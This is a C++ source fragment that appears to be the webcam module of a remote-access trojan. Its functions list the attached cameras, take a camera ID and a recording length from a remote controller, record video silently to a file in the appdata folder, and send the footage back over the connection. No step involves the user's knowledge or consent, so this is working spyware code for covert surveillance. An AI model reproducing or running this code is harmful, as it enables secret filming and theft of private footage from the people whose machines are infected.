void GetConnectedWebcams()
{
	ICaptureGraphBuilder2 *pBuild;
	ICreateDevEnum *pDevEnum;
	IPropertyBag *pPropBag;
	IGraphBuilder *pGraph;
	IEnumMoniker *pEnum;
	IMoniker *pMoniker;
	HRESULT webcam;
	VARIANT var;

	VariantInit(&var);
	webcam = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	webcam = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pBuild);
	webcam = CoCreateInstance(CLSID_FilterGraph, 0, CLSCTX_INPROC_SERVER, IID_IFilterGraph, (void**)&pGraph);

	webcam = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
	webcam = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
	if (webcam == S_FALSE) {
		send("NO_WEBCAMS");
		return;
	}

	std::wstring cams;
	while (pEnum->Next(1, &pMoniker, NULL) == S_OK)
	{
			webcam = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
			if (FAILED(webcam)) {
				pMoniker->Release();
				continue;
			}

			webcam = pPropBag->Read(L"FriendlyName", &var, 0);
			if (SUCCEEDED(webcam)) {
				std::wstring cd = (wchar_t*)var.bstrVal + (std::wstring)L"\n";
				cams.append(cd);
				VariantClear(&var);
			}
			
			pPropBag->Release();
			pMoniker->Release();
		}

		std::string cameraList(cams.begin(), cams.end());
		send(cameraList);
}

void CaptureWebcam()
{
		int cameras;
		int devices = 1;
		std::string filePath = appdata + "/wc.avi";

		HRESULT webcam;
		ICaptureGraphBuilder2 *pBuild;
		IGraphBuilder *pGraph;
		IBaseFilter *pCap, *pMux;
		IMoniker *pMoniker;
		IEnumMoniker *pEnum;
		ICreateDevEnum *pDevEnum;
		IMediaControl *pControl;
		IPropertyBag *pPropBag;
		VARIANT var;

		VariantInit(&var);
		webcam = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		webcam = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pBuild);
		webcam = CoCreateInstance(CLSID_FilterGraph, 0, CLSCTX_INPROC_SERVER, IID_IFilterGraph, (void**)&pGraph);
		pBuild->SetFiltergraph(pGraph);
		
		webcam = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
		webcam = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
		if (webcam == S_FALSE) {
			send("NO_WEBCAMS");
			return;
		}

		// retrieves all connected camera devices
		std::wstring cams;
		while (pEnum->Next(1, &pMoniker, NULL) == S_OK)
		{
				webcam = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
				if (FAILED(webcam)) {
					pMoniker->Release();
					continue;
				}

				webcam = pPropBag->Read(L"FriendlyName", &var, 0);
				if (SUCCEEDED(webcam)) {
					std::wstring cd = (wchar_t*)var.bstrVal + (std::wstring)L"\n";
					cams.append(cd);
					VariantClear(&var);
				}
				
				pPropBag->Release();
				pMoniker->Release();
				devices++;
		}

		std::string cameraList(cams.begin(), cams.end());
		send(cameraList);

		pEnum->Reset();

		int cameraID = atoi(recv(0).data());
		if (cameraID == NO_BYTES_IN_BUFFER) { return; }

		int duration = atoi(recv(0).data());
		if (duration == NO_BYTES_IN_BUFFER) { return; }

		for (int i = 0; i < cameraID; i++) {
			webcam = pEnum->Next(1, &pMoniker, NULL);
		}

		std::wstring wide_string( filePath.begin(), filePath.end() );
		webcam = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
		webcam = pGraph->AddFilter(pCap, L"Capture Filter");
		webcam = pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl);
		webcam = pBuild->SetOutputFileName(&MEDIASUBTYPE_Avi, wide_string.data(), &pMux, NULL);
		webcam = pBuild->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, NULL, pMux);
		
		// Capturing Webcam
		pControl->Run();
		Sleep(duration);
		pControl->Stop();
		
		// Releasing Memory from all Pointers
		pBuild->Release();
		pGraph->Release();
		pCap->Release();
		pMux->Release();
		pMoniker->Release();
		pEnum->Release();
		pDevEnum->Release();
		pControl->Release();
		CoUninitialize();
		
		std::ifstream localFile(filePath, std::ios::binary);
		if (!localFile.is_open()) {
				send("invalid");
				return;

		} send("valid");

		try {
				std::vector<char> buf(std::istreambuf_iterator<char>(localFile), {});
				std::string contents(buf.begin(), buf.end());

				localFile.close();
				sendAll(contents);

				logs.push_back(filePath);
		
		} catch (std::bad_alloc) {
				sendAll("bad_alloc");
		}
}